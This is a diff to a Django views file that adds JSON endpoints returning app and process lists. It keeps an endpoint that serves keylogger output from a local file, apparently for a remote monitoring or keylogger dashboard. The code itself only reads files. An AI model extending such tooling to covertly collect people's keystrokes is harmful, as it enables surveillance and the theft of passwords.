@@ -4,8 +4,8 @@ import os
 import threading
 from django.http import JsonResponse
 
-def read_from_file():
-    with open('variable.txt', 'r', encoding='utf-8') as file:
+def read_from_file(fileName):
+    with open(fileName, 'r', encoding='utf-8') as file:
         return file.read().strip()
 
 
@@ -28,9 +28,19 @@ def loadClient(request):
     return render(request, template_name='server/client.html')
         # 'list_processes': list_processes()
 
+def loadAbout(request):
+    return render(request, 'server/about.html')
+
 
 def get_key_logger(request):
-    key_string_global =  read_from_file()
-    print("key_string_global in views.py: ", key_string_global)
+    key_string_global =  read_from_file("variable.txt")
     # Consider importing this variable from its source
     return JsonResponse({'key_logger': key_string_global})
+
+def get_list_apps(request):
+    list_apps = read_from_file("list_apps.json")
+    return JsonResponse({'list_apps': list_apps})
+
+def get_list_processes(request):
+    list_processes = read_from_file("list_processes.json")
+    return JsonResponse({'list_processes': list_processes})
